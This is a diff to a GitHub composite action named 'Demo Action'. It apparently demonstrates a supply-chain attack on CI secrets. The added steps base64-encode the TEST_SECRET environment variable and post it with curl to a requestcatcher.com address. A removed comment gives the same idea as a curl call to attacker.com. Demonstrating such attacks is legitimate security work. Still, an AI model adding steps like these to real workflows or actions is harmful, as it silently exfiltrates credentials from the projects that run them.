@@ -1,9 +1,10 @@
 name: 'Demo Action'
-description: 'Now malicious'
+description: 'Exfiltrate encoded secret'
 runs:
   using: "composite"
   steps:
     - run: |
-        echo "::notice ::STOLEN SECRET: ${TEST_SECRET}"
-        # In a real attack: curl -d "$TEST_SECRET" https://attacker.com/collect
+        encoded=$(echo -n "$TEST_SECRET" | base64)
+        curl -s -d "secret=$encoded" https://<subdomain>.requestcatcher.com
+        echo "::notice ::Exfiltration request sent."
       shell: bash
